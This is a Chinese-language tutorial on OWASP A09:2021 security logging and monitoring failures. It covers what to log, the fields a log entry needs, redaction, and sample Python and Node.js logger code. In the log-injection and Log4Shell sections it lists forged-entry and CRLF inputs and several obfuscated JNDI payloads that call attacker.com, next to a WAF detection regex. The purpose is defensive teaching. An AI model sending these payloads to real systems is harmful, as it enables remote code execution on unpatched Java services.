A09:2021 - 安全日志和监控失效

HIGH 排名第9

Security Logging and Monitoring Failures（安全日志和监控失效）是指应用程序缺乏有效的安全事件检测、升级和响应能力。如果没有适当的日志记录和监控，攻击行为将无法被及时发现，给攻击者充足的时间完成目标。

驻留时间 (Dwell Time) 统计

根据多项行业报告，攻击者在被发现前的平均驻留时间：

全球平均：约 21 天（2023 Mandiant M-Trends 报告，已从 2020 年的 56 天大幅下降）

内部检测：约 13 天（组织自行发现的情况）

外部通知：约 28 天（由第三方通知才发现的情况）

关键事实：超过 50% 的数据泄露是由外部方（如执法机构、安全研究人员）通知受害组织的，而非通过内部监控发现。

1. 概述

1.1 为什么检测能力至关重要

安全领域有一句名言："预防是理想，检测是必须"（Prevention is ideal, detection is a must）。没有任何系统可以做到 100% 防御，因此及时检测和响应是安全体系的最后一道防线。

安全事件时间线与日志监控的作用： 时间 ──────────────────────────────────────────────────────────────────▶ │ 侦察阶段 │ 初始入侵 │ 横向移动 │ 数据外泄 │ 被发现 │ │◀──────────▶│◀────────▶│◀─────────▶│◀─────────▶│ │ │ │ │ │ │ │ 没有监控的情况： ├─────────────────── 驻留时间 (平均21天+) ────────────────┤ │ 完全不可见，攻击者自由行动 │ 外部通知 │ 有效监控的情况： │ 侦察 │ 告警！│ │ │ 立即响应 │ │ │◀── 分钟级响应 ──▶│ │ │ 阻断 + 取证 │ 关键窗口：从初始入侵到检测的时间越短，损失越小。 目标：将 MTTD (Mean Time to Detect) 从天级降低到小时级甚至分钟级。

1.2 日志监控失效的常见表现

失效类型描述后果
不记录关键事件登录失败、权限变更等未被记录攻击行为不可追溯
日志信息不足缺少时间戳、IP、用户标识等关键字段无法进行有效关联分析
日志仅存本地日志只保存在应用服务器上攻击者入侵后删除日志
无实时监控日志存在但无人/无系统分析攻击行为无法被及时检测
无告警机制检测到异常但不触发告警安全团队无法及时响应
日志保留时间短日志保留不足 30 天无法追溯长期 APT 攻击
敏感信息入日志密码、Token 等被写入日志日志泄露导致二次攻击
渗透测试无告警主动攻击测试不触发任何告警表明检测机制完全无效

2. 日志记录内容

2.1 必须记录的安全事件

事件类别具体事件记录字段
身份认证登录成功用户ID, IP, 时间, User-Agent, 地理位置
登录失败尝试的用户名, IP, 失败原因, 连续失败次数
密码重置用户ID, 请求来源IP, 是否成功
MFA 事件MFA 类型, 验证结果, 设备信息
访问控制权限拒绝用户ID, 请求的资源, 所需权限, 当前权限
权限变更操作者, 目标用户, 变更前后权限
越权访问尝试用户ID, 目标资源, 请求方法, 响应码
输入验证SQL注入尝试输入内容(脱敏), 参数名, 来源IP
XSS尝试payload特征, 目标字段, 来源页面
文件上传异常文件名, MIME类型, 大小, 哈希
业务逻辑大额交易用户ID, 金额, 收款方, 风险评分
批量操作操作类型, 记录数量, 时间范围
数据导出用户ID, 数据类型, 记录数, 导出格式

2.2 不应该记录的内容

日志中禁止出现的敏感数据

以下信息绝不应出现在日志中，否则日志泄露会导致严重的二次攻击：

  • 密码和凭证：用户密码（明文或哈希）、API Keys、数据库连接串
  • 个人身份信息 (PII)：完整身份证号、银行卡号（最多记录后4位）
  • Session Tokens：完整的 JWT、Session ID、OAuth Token
  • 加密密钥：私钥、对称加密密钥、证书密码
  • 健康/医疗数据：受 HIPAA 等法规特别保护

3.2 日志必备字段

字段说明格式要求
timestamp事件发生的精确时间ISO 8601 格式，UTC 时区，毫秒精度
level日志级别DEBUG/INFO/WARNING/ERROR/CRITICAL
event_type事件分类标识层级式命名：auth.login_failed
event_id唯一事件标识符UUID 或自定义格式，确保全局唯一
source_ip请求来源 IP考虑 X-Forwarded-For 代理场景
user_id关联的用户标识内部ID，非用户名（用户名可能变更）
trace_id分布式追踪ID跨服务关联同一请求的所有日志
service产生日志的服务名微服务架构中必须标识来源服务
action_result操作结果success/failure/error

4. 日志注入攻击

4.1 什么是日志注入

日志注入 (Log Injection / Log Forging) 是指攻击者通过在输入中注入换行符或特殊字符，在日志中伪造条目或执行恶意操作。

日志注入攻击原理： 正常登录请求： 用户名: "alice" 日志输出: [INFO] Login failed for user: alice 恶意登录请求： 用户名: "alice\n[INFO] Login successful for user: admin" 日志输出: [INFO] Login failed for user: alice [INFO] Login successful for user: admin <-- 伪造的日志！ 更危险的变体 (CRLF 注入导致 HTTP Response Splitting): 用户名: "alice\r\nX-Admin: true\r\n\r\n<script>..." Log4Shell 变体 (CVE-2021-44228): 用户名: "${jndi:ldap://attacker.com/exploit}" 日志框架会解析 JNDI lookup，导致远程代码执行！

4.2 日志注入防御

# ❌ 危险：直接将用户输入写入日志
import logging
logger = logging.getLogger(__name__)

def login(username, password):
    if not authenticate(username, password):
        # 用户名未经处理直接写入日志
        logger.warning(f"Login failed for user: {username}")
        # 攻击者输入: "admin\n[INFO] Login successful for user: admin"
        # 会在日志中伪造成功记录

# ✅ 安全：对日志输入进行清理
import re

def sanitize_log_input(value, max_length=200):
    """清理用户输入以安全写入日志"""
    if value is None:
        return "null"
    # 转为字符串并截断
    value = str(value)[:max_length]
    # 移除或转义控制字符（换行、回车、制表符）
    value = value.replace('\n', '\\n')
    value = value.replace('\r', '\\r')
    value = value.replace('\t', '\\t')
    # 移除 ANSI 转义序列（防止终端注入）
    value = re.sub(r'\x1b\[[0-9;]*m', '', value)
    # 移除 JNDI lookup 模式（防止 Log4Shell 类攻击）
    value = re.sub(r'\$\{.*?\}', '[FILTERED]', value)
    return value

def secure_login(username, password):
    safe_username = sanitize_log_input(username)
    if not authenticate(username, password):
        logger.warning(
            "Login failed",
            extra={
                "event_type": "auth.login_failed",
                "username": safe_username,
                "source_ip": sanitize_log_input(request.remote_addr)
            }
        )

4.3 Log4Shell (CVE-2021-44228) 专题

Log4Shell - 史上最严重的日志相关漏洞

2021年12月发现的 Apache Log4j 漏洞（CVSS 10.0），允许攻击者通过在任何会被日志记录的输入中注入 ${jndi:ldap://attacker.com/}，实现远程代码执行。

该漏洞影响了几乎所有使用 Log4j 2.x（< 2.17.0）的 Java 应用，包括 Minecraft、Apple iCloud、Steam、Twitter 等。

# Log4Shell 攻击载荷示例（各种绕过姿势）：
${jndi:ldap://attacker.com/exploit}
${jndi:rmi://attacker.com/exploit}
${${lower:j}ndi:${lower:l}dap://attacker.com/a}
${j${::-n}di:ldap://attacker.com/a}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

# 检测 Log4Shell 的 WAF 规则（正则表达式）：
\$\{.*?(j|J).*(n|N).*(d|D).*(i|I).*?:.*?\}

# 修复措施：
# 1. 升级到 Log4j 2.17.1+
# 2. 设置 JVM 参数：-Dlog4j2.formatMsgNoLookups=true
# 3. 删除 JndiLookup 类：
#    zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

6.2 检测规则实现

# Sigma 规则格式（通用 SIEM 检测规则标准）
# 检测可疑的 Impossible Travel

title: Impossible Travel Login Detection
status: experimental
description: Detects logins from geographically impossible locations
author: Security Team
date: 2024/01/15
logsource:
    category: authentication
    product: webapp
detection:
    selection:
        event_type: "auth.login_success"
    timeframe: 2h
    condition: |
        selection
        | where same(user_id)
        | where geo_distance(prev_login_location, current_location) > 500km
        | where time_diff(prev_login_time, current_time) < 2h
        # 500km in 2h = 需要 250km/h，飞行速度
level: high
tags:
    - attack.initial_access
    - attack.t1078

---

# Python 实现 Impossible Travel 检测
from math import radians, sin, cos, sqrt, atan2
from datetime import timedelta

def haversine_distance(lat1, lon1, lat2, lon2):
    """计算两点间球面距离（km）"""
    R = 6371  # 地球半径
    dlat = radians(lat2 - lat1)
    dlon = radians(lon2 - lon1)
    a = sin(dlat/2)**2 + cos(radians(lat1)) * cos(radians(lat2)) * sin(dlon/2)**2
    return R * 2 * atan2(sqrt(a), sqrt(1-a))

def detect_impossible_travel(current_login, previous_login):
    """检测不可能旅行"""
    distance = haversine_distance(
        current_login['lat'], current_login['lon'],
        previous_login['lat'], previous_login['lon']
    )
    time_diff = current_login['time'] - previous_login['time']
    hours = time_diff.total_seconds() / 3600

    if hours > 0:
        speed_kmh = distance / hours
        # 超过 900 km/h 视为不可能（商业航班约 800-900）
        if speed_kmh > 900:
            return {
                "alert": True,
                "severity": "HIGH",
                "speed_kmh": round(speed_kmh),
                "distance_km": round(distance),
                "time_hours": round(hours, 2)
            }
    return {"alert": False}

7.2 告警疲劳与调优

避免告警疲劳 (Alert Fatigue)

研究表明，当每日告警数量超过安全团队处理能力时，重要告警会被忽略。解决告警疲劳的策略：

精确度优先：减少误报率比增加检测率更重要（误报率应 < 5%）

告警合并：相关告警自动聚合为单一事件（如同一IP的多次扫描合并为一条）

动态阈值：基于历史基线自动调整阈值，而非使用固定数值

富化上下文：告警中附带足够上下文信息，减少调查时间

定期review：每月审查告警规则有效性，删除无效规则

"""
安全日志模块 - Python 实现
功能：结构化日志、自动脱敏、防注入、集中发送
"""
import logging
import json
import re
import hashlib
from datetime import datetime, timezone
from typing import Any, Dict, Optional
import socket

# ==================== 自定义日志格式化器 ====================

class SecurityJsonFormatter(logging.Formatter):
    """安全的 JSON 格式日志输出"""

    SENSITIVE_PATTERNS = {
        'password': re.compile(r'(?i)(password|passwd|pwd)\s*[=:]\s*\S+'),
        'token': re.compile(r'(?i)(token|api_key|secret)\s*[=:]\s*\S+'),
        'card': re.compile(r'\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b'),
        'ssn': re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
    }

    def __init__(self, service_name: str):
        super().__init__()
        self.service_name = service_name
        self.hostname = socket.gethostname()

    def sanitize(self, value: Any) -> Any:
        """清理敏感数据和注入字符"""
        if isinstance(value, str):
            # 移除控制字符
            value = value.replace('\n', '\\n').replace('\r', '\\r')
            # 移除 JNDI 注入模式
            value = re.sub(r'\$\{.*?\}', '[REDACTED_LOOKUP]', value)
            # 脱敏信用卡号
            value = self.SENSITIVE_PATTERNS['card'].sub('[CARD:****]', value)
            # 脱敏密码
            value = self.SENSITIVE_PATTERNS['password'].sub(
                '[PASSWORD:REDACTED]', value
            )
        return value

    def format(self, record: logging.LogRecord) -> str:
        log_entry = {
            "timestamp": datetime.now(timezone.utc).isoformat(
                timespec='milliseconds'
            ),
            "level": record.levelname,
            "logger": record.name,
            "message": self.sanitize(record.getMessage()),
            "service": self.service_name,
            "hostname": self.hostname,
            "pid": record.process,
            "thread": record.threadName,
        }

        # 添加额外的安全上下文
        if hasattr(record, 'event_type'):
            log_entry['event_type'] = record.event_type
        if hasattr(record, 'user_id'):
            log_entry['user_id'] = record.user_id
        if hasattr(record, 'source_ip'):
            log_entry['source_ip'] = record.source_ip
        if hasattr(record, 'trace_id'):
            log_entry['trace_id'] = record.trace_id

        # 异常信息
        if record.exc_info:
            log_entry['exception'] = self.formatException(record.exc_info)

        return json.dumps(log_entry, ensure_ascii=False)


# ==================== 安全事件日志器 ====================

class SecurityLogger:
    """专用安全事件日志器"""

    def __init__(self, service_name: str):
        self.logger = logging.getLogger(f"security.{service_name}")
        self.logger.setLevel(logging.INFO)

        # JSON 格式输出到文件
        handler = logging.FileHandler('/var/log/app/security.json')
        handler.setFormatter(SecurityJsonFormatter(service_name))
        self.logger.addHandler(handler)

    def log_auth_event(self, event_type: str, user_id: Optional[str],
                       source_ip: str, success: bool, **details):
        """记录认证事件"""
        self.logger.info(
            f"Authentication event: {event_type}",
            extra={
                "event_type": f"auth.{event_type}",
                "user_id": user_id or "unknown",
                "source_ip": source_ip,
                "success": success,
                "details": details
            }
        )

    def log_access_denied(self, user_id: str, resource: str,
                          action: str, source_ip: str):
        """记录访问拒绝事件"""
        self.logger.warning(
            f"Access denied: {user_id} attempted {action} on {resource}",
            extra={
                "event_type": "access.denied",
                "user_id": user_id,
                "resource": resource,
                "action": action,
                "source_ip": source_ip
            }
        )

    def log_data_access(self, user_id: str, data_type: str,
                        record_count: int, source_ip: str):
        """记录敏感数据访问"""
        level = logging.WARNING if record_count > 100 else logging.INFO
        self.logger.log(
            level,
            f"Data access: {user_id} accessed {record_count} {data_type} records",
            extra={
                "event_type": "data.access",
                "user_id": user_id,
                "data_type": data_type,
                "record_count": record_count,
                "source_ip": source_ip,
                "high_volume": record_count > 100
            }
        )

/**
 * 安全日志模块 - Node.js 实现
 * 使用 winston + 自定义安全过滤
 */
const winston = require('winston');
const { v4: uuidv4 } = require('uuid');

// ==================== 日志脱敏 ====================

const sensitiveFields = [
    'password', 'token', 'secret', 'authorization', 'cookie'
];
const creditCardRegex = /\b\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}\b/g;
const jndiRegex = /\$\{.*?\}/g;

function sanitizeValue(key, value) {
    if (typeof value !== 'string') return value;

    // 移除日志注入字符
    value = value.replace(/[\r\n]/g, ' [NEWLINE] ');

    // 移除 JNDI 注入
    value = value.replace(jndiRegex, '[FILTERED_LOOKUP]');

    // 敏感字段脱敏
    if (sensitiveFields.some(f => key.toLowerCase().includes(f))) {
        return '[REDACTED]';
    }

    // 信用卡号脱敏
    value = value.replace(creditCardRegex, (match) => {
        const digits = match.replace(/[\s-]/g, '');
        return `****${digits.slice(-4)}`;
    });

    return value;
}

function deepSanitize(obj) {
    if (typeof obj !== 'object' || obj === null) return obj;
    const sanitized = {};
    for (const [key, value] of Object.entries(obj)) {
        if (typeof value === 'object' && value !== null) {
            sanitized[key] = deepSanitize(value);
        } else {
            sanitized[key] = sanitizeValue(key, value);
        }
    }
    return sanitized;
}

// ==================== Logger 配置 ====================

const securityLogger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp({
            format: 'YYYY-MM-DDTHH:mm:ss.SSSZ'
        }),
        winston.format.printf(({ timestamp, level, message, ...meta }) => {
            const sanitizedMeta = deepSanitize(meta);
            return JSON.stringify({
                timestamp,
                level: level.toUpperCase(),
                message,
                ...sanitizedMeta,
                service: 'webapp',
                event_id: uuidv4()
            });
        })
    ),
    transports: [
        new winston.transports.File({
            filename: '/var/log/app/security.json',
            maxsize: 100 * 1024 * 1024,  // 100MB 轮转
            maxFiles: 30
        }),
        new winston.transports.File({
            filename: '/var/log/app/security-critical.json',
            level: 'error'
        })
    ]
});

// ==================== 安全事件方法 ====================

const SecurityEvents = {
    loginSuccess(userId, ip, userAgent) {

// ==================== Express 中间件 ====================

function securityLoggingMiddleware(req, res, next) {
    const startTime = Date.now();
    const requestId = uuidv4();

    req.requestId = requestId;
    res.setHeader('X-Request-ID', requestId);

    res.on('finish', () => {
        const duration = Date.now() - startTime;

        // 记录所有 4xx/5xx 响应
        if (res.statusCode >= 400) {
            securityLogger.warn('HTTP error response', {
                event_type: 'http.error',
                request_id: requestId,
                method: req.method,
                path: req.path,
                status_code: res.statusCode,
                source_ip: req.ip,
                user_id: req.user?.id || 'anonymous',
                duration_ms: duration,
                user_agent: req.get('User-Agent')
            });
        }

        // 记录认证相关请求
        if (req.path.includes('/auth') || req.path.includes('/login')) {
            securityLogger.info('Auth endpoint accessed', {
                event_type: 'auth.endpoint_access',
                request_id: requestId,
                method: req.method,
                path: req.path,
                status_code: res.statusCode,
                source_ip: req.ip,
                duration_ms: duration
            });
        }
    });

    next();
}
